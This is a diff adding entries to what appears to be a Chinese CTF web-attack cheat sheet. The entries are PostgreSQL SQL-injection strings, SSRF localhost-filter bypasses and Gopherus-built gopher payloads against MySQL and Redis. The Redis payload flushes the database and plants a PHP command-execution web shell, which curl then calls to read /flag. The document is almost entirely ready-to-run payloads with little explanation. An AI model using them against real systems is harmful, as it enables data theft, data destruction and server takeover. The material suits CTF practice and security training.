@@ -208,3 +208,76 @@ set global slow_query_log_file='/var/www/html/info.php';	--修改日志文件路
 select '<?php @eval($_GET[1]);?>' or sleep(11);
 /info.php?1=system('/cat_flag');
 ```
+### SQL注入-017
+> postgresql int类型注入 
+```text 
+
+?id=-1 UNION select null,string_agg(tablename, ','),null from pg_tables where schemaname='public' # 查表
+?id=-1 union select null,string_agg(column_name, ','),null from information_schema.columns where table_schema='public' and table_name='users' # 查列
+?id=-1 UNION ALL SELECT NULL,(COALESCE(CAST(flag AS VARCHAR(10000))::text,(CHR(32)))),NULL FROM public.flag--+
+
+```
+### SQL注入-018
+> postgresql 字符串类型注入 `?id=-1' UNION ALL SELECT NULL,(COALESCE(CAST(flag AS VARCHAR(10000))::text,(CHR(32)))),NULL FROM public.flag--+`
+### SQL注入-019
+> postgresql bool类型注入
+```python
+# ?id=-1 and ascii(substring((sql语句),{1}},1)) = {2};
+```
+## SSRF
+
+### SSRF-001
+> `proxy=http://127.0.0.1:80/flag.php`
+
+### SSRF-002
+> 回环地址写法，不止`127.0.0.1`
+```text
+proxy=http://127.1/flag.php
+```
+
+### SSRF-003
+> 将`127.0.0.1`进行转换，转换为其他进制的数从而绕过检测
+> 进制转换结果如下
+```text
+0177.0.0.1 //八进制
+0x7f.0.0.1 //十六进制
+2130706433 //十进制
+```
+
+### SSRF-004
+> 将`127.0.0.1`进行转换，转换为其他进制的数从而绕过检测
+> 进制转换结果如下
+```text
+0177.0.0.1 //八进制
+0x7f.0.0.1 //十六进制
+2130706433 //十进制
+```
+
+### SSRF-005
+> 特征
+```text
+proxy=http://127.0.0.1./flag.php 
+```
+
+### SSRF-006
+gopher 协议 攻击 内网 
+
+工具: [gopherus](https://github.com/tarunkant/Gopherus)
+```text
+proxy=gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%1c%00%00%00%03%75%73%65%20%63%74%66%3b%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%3b%01%00%00%00%01
+```
+
+### SSRF-007
+gopher 协议 攻击 内网
+
+工具: [gopherus](https://github.com/tarunkant/Gopherus)
+```text
+proxy=gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%1c%00%00%00%03%75%73%65%20%63%74%66%3b%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%3b%01%00%00%00%01
+```
+
+### SSRF-008
+gopher 协议 攻击 内网
+```text
+curl -X POST http://127.0.0.1:1408/ -d 'proxy=gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A'
+curl http://127.0.0.1:1408/shell.php?cmd=cat+/flag
+```
